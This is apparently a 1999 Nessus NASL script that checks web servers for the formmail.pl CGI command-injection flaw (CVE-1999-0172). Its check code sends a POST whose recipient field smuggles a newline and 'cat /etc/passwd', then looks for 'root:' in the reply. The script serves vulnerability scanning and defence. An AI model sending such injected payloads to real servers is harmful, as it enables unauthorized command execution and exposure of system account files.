#
# This script was written by Mathieu Perrin <mathieu@tpfh.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10076);
 script_bugtraq_id(2079);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-1999-0172");
 
 name["english"] = "formmail.pl";
 name["francais"] = "formmail.pl";
 script_name(english:name["english"], francais:name["francais"]);

 desc["english"] = "The 'formmail.pl' is installed. This CGI has
 a well known security flaw that lets anyone execute arbitrary
 commands with the privileges of the http daemon (root or nobody).

Solution :  remove it from /cgi-bin.

Risk factor : High";

desc["francais"] = "Le cgi 'formmail.pl' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de faire
executer des commandes arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody).

Solution : retirez-le de /cgi-bin.

Facteur de risque : Sérieux";



 script_description(english:desc["english"], francais:desc["francais"]);

 summary["english"] = "Checks for the presence of /cgi-bin/formmail.pl";
 summary["francais"] = "Vérifie la présence de /cgi-bin/formmail.pl";
   
 script_summary(english:summary["english"], francais:summary["francais"]);

 script_category(ACT_GATHER_INFO);


 script_copyright(english:"This script is Copyright (C) 1999 Mathieu Perrin",
         francais:"Ce script est Copyright (C) 1999 Mathieu Perrin");

 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 
 exit(0);
}	  

# deprecated
exit (0);

  
#
# The script code starts here
#
include("http_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if( get_kb_item("Services/www/" + port + "/embedded") ) exit(0);


foreach dir (cgi_dirs())
{
  a = string("POST ", dir, "/formmail.pl HTTP/1.0\r\n");
  aa = string("POST ", dir, "/formmail HTTP/1.0\r\n");

  b = string("Content-length: 120\r\n\r\n");
  c = string("recipient=root@localhost%0Acat%20/etc/passwd&email=nessus@localhost&subject=test\r\n\r\n");
  d = crap(200);
  soc = http_open_socket(port);
  if(soc)
  {
    req1 = a+b+c+d;
    send(socket:soc, data:req1);
    r = http_recv(socket:soc);
    http_close_socket(soc);
    if("root:" >< r)
    {
      security_hole(port);
      exit(0);
    }

    soc2 = http_open_socket(port);
    if(!soc2)exit(0);
    req2 = aa+b+c+d;
    send(socket:soc2, data:req2);
    r2 = http_recv(socket:soc2);
    http_close_socket(soc2);
    if("root:" >< r2)
    {
      security_hole(port);
      exit(0);
    }
   }
}
   
